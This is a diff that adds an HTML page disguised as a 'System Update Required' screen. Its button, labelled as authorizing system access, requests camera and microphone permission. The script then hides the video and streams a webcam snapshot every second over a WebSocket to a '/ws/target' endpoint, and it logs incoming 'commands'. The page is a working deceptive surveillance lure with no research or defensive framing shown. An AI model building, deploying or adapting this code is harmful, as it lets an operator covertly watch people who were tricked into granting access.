@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update Required</title>
+    <style>
+        body {
+            background: black;
+            color: #00ffcc;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #status {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00ffcc;
+        }
+
+        button {
+            background: transparent;
+            border: 2px solid #00ffcc;
+            color: #00ffcc;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #00ffcc;
+            color: black;
+        }
+
+        video {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>OMNILINK // SYS.INIT</h1>
+    <div id="status">AWAITING USER AUTHORIZATION...</div>
+    <button onclick="initiateLink()">AUTHORIZE SYSTEM ACCESS</button>
+    <video id="cam" autoplay></video>
+
+    <script>
+        let ws;
+
+        async function initiateLink() {
+            document.getElementById('status').innerText = "REQUESTING PERIPHERALS...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('cam').srcObject = stream;
+
+                const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+                const host = window.location.host || "127.0.0.1:8000";
+                const wsUrl = `${protocol}//${host}/ws/target`;
+                ws = new WebSocket(wsUrl);
+
+                ws.onopen = function () {
+                    document.getElementById('status').innerText = "SYSTEM INTEGRATION COMPLETE.";
+                    document.querySelector('button').style.display = 'none';
+                    setInterval(sendFrame, 1000);
+                };
+
+                ws.onmessage = function (event) {
+                    console.log("Command received:", event.data);
+                };
+
+            } catch (err) {
+                document.getElementById('status').innerText = "ACCESS DENIED BY USER.";
+            }
+        }
+
+        function sendFrame() {
+            const video = document.getElementById('cam');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            const data = canvas.toDataURL('image/jpeg', 0.5);
+            ws.send(data);
+        }
+    </script>
+</body>
+
+</html>
